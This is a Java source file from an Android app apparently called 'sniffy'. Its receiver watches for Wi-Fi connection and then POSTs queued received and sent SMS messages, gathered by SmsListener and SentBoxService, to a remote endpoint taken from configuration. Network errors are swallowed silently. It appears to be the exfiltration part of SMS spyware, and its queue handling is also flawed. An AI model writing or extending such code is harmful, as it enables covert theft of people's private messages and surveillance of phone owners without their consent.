package com.app.sniffy;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Queue;

import org.apache.http.client.ClientProtocolException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;

public class ConnectionReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		if(intent.getAction().equals(WifiManager.NETWORK_STATE_CHANGED_ACTION)) {
			NetworkInfo currentNetworkInfo = (NetworkInfo) intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);       
			// do application-specific task(s) based on the current network state, such 
			// as enabling queuing of HTTP requests when currentNetworkInfo is connected etc.
			if(currentNetworkInfo.isConnected() && SmsListener.incomingQueue != null){
				if(SmsListener.incomingQueue.peek() != null){
					try {
						new sendQueueMessages(SmsListener.incomingQueue).execute(new URI(Utils.getConfigProperty(context.getResources(), "sendIncoming")));
					} catch (URISyntaxException e) {
						e.printStackTrace();
					}

				}
			}
			
			if(currentNetworkInfo.isConnected() && SentBoxService.sentQueue != null){
				if(SentBoxService.sentQueue.peek() != null){
					try {
						new sendQueueMessages(SentBoxService.sentQueue).execute(new URI(Utils.getConfigProperty(context.getResources(), "sendIncoming")));
					} catch (URISyntaxException e) {
						e.printStackTrace();
					}

				}
			}
		}

	}

	protected class sendQueueMessages extends AsyncTask<URI, Void, String> {

		Queue<JSONObject>  message;
		
		public sendQueueMessages(Queue<JSONObject>  message){
			this.message = message;
		}

		@Override
		protected String doInBackground(URI... url) {
			int count = url.length;
			String result = "";
			for (int i = 0; i < count; i++) {
				try {
					for(JSONObject mess : message)
						result = APICall.makePostConnection(url[i],mess);
					
					message.poll();
				} catch (ClientProtocolException e) {
					
				} catch (IOException e) {
					
				}
			}
			return result;
		}

		@Override
		protected void onPostExecute(String result) {
			
		}
	}
}

